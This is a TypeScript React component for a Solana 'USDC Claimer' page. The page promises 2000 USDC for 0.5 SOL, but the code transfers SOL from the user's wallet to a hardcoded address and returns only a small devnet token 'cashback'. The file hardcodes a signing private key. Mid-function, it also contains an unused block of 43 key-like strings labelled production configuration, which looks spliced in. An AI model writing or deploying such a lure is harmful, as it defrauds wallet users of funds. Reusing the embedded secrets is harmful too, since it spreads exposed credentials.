/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "44HF2pewVeNAdM3HN9UyMSwXsfLKKR5QZij2J2wXcP4wb6nDAM3Y8owjzNQHKaMdeJMKizd12SDtkNfDQJWL6jrs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "b8HDbn4Wxni294oJnHdTKhi1GaTYWVKAGczfn4SZA63HSx53tY8yVSADh5i6SNNWbxn7MLYiSW619AzFaPAbJ8i",
  "key1": "uCAaULXkvXAYoBdEA1n7NKcgSv971nZD49Q4m938yu118qnP5BEBdEAwSDycD7QNp3FHUmschvERShjXYFZ7AGu",
  "key2": "e5eNxETERrh9dKJSNL3CXhe2ih3koXt2GWGjRrBdgvMTwBGHz5HWJVn7xHyovLGVyqtqmrySXkxN3XkGWN92TMJ",
  "key3": "4Rmx1dM2MKFqZCWeH4ngyaF7VanZkFqfwyGfPv92s7gQPrrxsegu454wNVvbN2cNbkHNmAi6PDUDEXP6piYiLdV6",
  "key4": "4QMPvxKJvw44542JwdZP7yCxccBp9YVwqQutFvhmpXH6mv7PtoHbKsgLpBw5WVNyFA1DDygCiM11WGykPnWSu37",
  "key5": "41RyLqM5bQmiB7EVWTiL86b8fFA8A4PZABZCRgP3AZ4u4cVAvMnh51MSoDrKP2Y3MiaRmnnhQVisHyTBK3U3MoM9",
  "key6": "3bmzTJ6ANAaM9iV7TVfaRjDfuCk3NQUF5V1CFZZP8eV4k7nGdrSmBk4CMzR5dpojuwZrtQMaLc4paRs8wXLSRzth",
  "key7": "3sbYbnLp7FddpahTUKM2bAct4Nz7gu6Sy11iVe7sdKFAVjeeB14ypBRqVu9qTuNRFGu8aY3Pq8YMPehXKTeeJYAn",
  "key8": "2iHEt4BUncWB54nLkYVGk8gGCateFprvau79FQ9424NctUNfy1fnfaMrxAdEyGM9KtGioETjMKY9fFnPQZoknYob",
  "key9": "35MiSBrvqLKyoWhfYyAtS7JASSGRPdcVP5WaCkGFXmUgZ343LKpcmmUtAD51EvA2fjM7BrdDT4uDTaNzBm8YazE",
  "key10": "2MqFSEJPmyA3KKyGS6qLx32xAQYD4DgDedXEsfGquBGxxyLEJxHZiFhzxxLokWHm4V1qgvgJAC1jmQF6oYtawnRi",
  "key11": "49VeGqV7wJH94iqqgD24Y2ZDS94xWQNZJU3U4tuepndY6zKMaeuP9czLTwn6y4cZYstkWSirirEfBxcSCs8uyNHS",
  "key12": "4MwftbdxBd1s1L9Wg2xbtqBBtaPyKZE86oauvjwv2KKvJWpBid2Uy5XRGj45wA59HHFRETP9mPn1GsvJtLdt3M88",
  "key13": "2XAswd3Hv4e19MfQj9rTyv2oczMAvLb5KTiVfPuLxm8ju7UU8d7ntUsU6sdDwB5xiHre2BL6egGK41dun8xtPnLu",
  "key14": "5HSFffajGKYDKwZCJu6g96JhPcQHWZ3H2tj8joL2tk8UX71pi3rBB2YC8tcYDPRG8JdTzebS2nAYJH9TAxmGe2Hz",
  "key15": "QukZgR41f5SSVgsPoqcz9nrztdtREZCHXzVuXoApbdTnvokxeRhXBHQS6697aWBgRt5DmU7DZNhNYds3bBH6aUu",
  "key16": "5D2KfmDqGGVYWboCZHsHStqnrJGjT5QgPmTBpqDsjrHWjNSRCJWCQGbd9fer6bXv2qEgHKnSixb5xUEqToXw82Tc",
  "key17": "3jGspiePgTWSYLeUqpP8KvnnPvMJtXF7nbrNebWzCkhDHPofUynJWUqZjuLLUrARPQbbAe158dBYQxdK2Bdhvqjm",
  "key18": "WKvei8sCCiQxW4XAf8SgcFJPbD6S44aWupJrELuAFjuRFd94PxfQ8M75NVDSHqf2FpYA3UuBhndnkJTHsyfQAHi",
  "key19": "3EEx1rkfEWyqASw69uAuFMrxeEPmxjTrowk9G6nDe9PHxTVSHbCD9ttJCWV4AocSw1wG4PQHy6vdXXSby2YRzJou",
  "key20": "3ouCgXAYE1BnFTnYqYCuACAg8Yy5eqeV28hdTTq3M1ZEjHpEQRvaGvMwmuhB8sQ437ViNV7V2L7j3J1Fx6Zbszec",
  "key21": "4FC7hjKzVYvrT8aZRhV2Xds1c1jhR47tfc8wttYcrW79h4w9RyTCEiBnBnjYpVvZT6JFgArSYrJFHvuRp4QoydoM",
  "key22": "2Tzn54xmtSxpJcyshZKMbX1D8x9UYuFCumWE6MDZ9Ek19SLjfgm6iLgTfACVNX5Vx7kk35qfoX9mdCWFgVQie2pn",
  "key23": "4SmEwqMPgZBUqaT6UouerDqauHSZuH24NqzMzDame54rR5RDGiA4iUdiVx7HN82jeAeU3S8vkyXna8EGeEadn36D",
  "key24": "5K6vkigx7r1pULNro5gebkX1qUbHrqa8ZNMQeKWsfhnzwnn2RLePQUnLUoiTgw49HtR1DwJ8g8EGimoK2vkgM3yq",
  "key25": "51R7v2qP5c2B9Y4DwAU8MBdTLaVVvT42FBbNajpbj43MYXLocc7kqKKoHshxw54SHSBtt1Rs1dDazQq6ttdwYewn",
  "key26": "5A58napxoDs3RkqZ4M8oqE1xv7K3ycStRgdyKGrkyDPNoXG6pfXUzDBtTMdhy8s78Et7X63TMVXvUD3hhXJLvZt3",
  "key27": "sQ7dED3E2raMHBW7ZcT63ZMoUhG7ZXbcjxBfgkRNdxMvVLZ3wN3eGchLs6BiLSSSzj2hWHqx2v4rHmkbGvEqcrj",
  "key28": "5sDpUMtufggW4YfRcdC49EWQUqMEyBprrK6Z2XbCX3imiwWjjZkJrZhbcyjNyxkZcxHYNhpWHfqY8HRBsSVikGeb",
  "key29": "28seovqEEzZEbrhmHoc3DXZpTCPby4nmeubQnDHc6s4qBm1HXz6FRuMZG3YD26rR8ca2KgmNe5aQJ2sDEEbT9yp7",
  "key30": "eogF63wEay4YaPZKx2hqDmoQaufhBiSj9B33kqGRxQAcx8NrVTtx4H25BUQMWVQNM1kBRWgDKemmdkvzbYxk6Ah",
  "key31": "3zQk8LA5sV4DdgmmATGstXA5MQDRyVGupD5ysFawCBsKbXSTG6D62SgdJey41RY959E13PjQ81Pm7QwTbctxVDr2",
  "key32": "FRJW82CP55jU3ksXtAj6F51yq2PYLWgm84ZcPBo8XgGVdPyiD3akpwCCWigumxYHkq4rt9eYqM8BQGtYAztEwKj",
  "key33": "2oVLQZoSQPBgjPjUcZqcCm16qxdKZtVxf9dCsthoZXbjao9pzzK9FbyFUn69sTY3PejCjK8G8FiPdh6KksBggKP3",
  "key34": "61jwEtKusFCwYPKwRtnRuFHgHkNdfXBQsvcVX3vUZGMr8eDnPSL9g8nSMT4tUyG3CxwMicwSrjgEvFHoc7LHY468",
  "key35": "4Acry8G1YMT1b7fLaWiMpuzJiMJTrhDWzXewNGCsxPwhHW3zurqp3boDmMk748zQk6827YYpisBrA5aiPutaZPPY",
  "key36": "3vDTtZ7Wo72RvwD38d8jrATRi8D9DpCPfM5tndpDDow4AkNdgLcqoSkYXKCZDDyMjZoHowP3ay6wy4YuezaZ4MgG",
  "key37": "PLH32J42Lc1X4wXQDVPUYpZ5stztgrJ44KvMMtib4J655Ub6eiCgzqKA6CqkpNew4R1rfpJkzUumYkBfKfajPvV",
  "key38": "2cDXnAAfF9ckRgeZKDfKf1cFMVasNwKdky6VRBnJMhTe4GqYmJgPeiQU6PsBmKutbeHfsSYxzQSEBBX8F8HshXFL",
  "key39": "2WFbLzw3gMdbYEe9gShyZk1dCxBW4wnEUokeopV2quMTYYdedMo6rZMZtmALohJZ1LZZAgzBkM9uCTuAU3bt3p3",
  "key40": "5RoH2LjXuZhbgUhkYLVGHBhcaJYayfNtCytHziBZYwy2qhQj3Ue3K1KRupPycWYiBi8hq4aZW8e6r5Hz2ocspkKC",
  "key41": "3w4EFdMK1pibWg7VJaKHoDTvD4UXmUrSCyAsohFmQWJMTEv5JqFWdJcFrNf177GswvtMLW5RwCodHJJ4G9QBLCZv",
  "key42": "4wzgZyNmaM3K7dsvtLqnHPDSKqogcSr8XU9X4Nx68v9mHWdk2pkPciaR4MfbXdoqXEa5VPf9ZTPnjLivW3H4Yj1Y"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
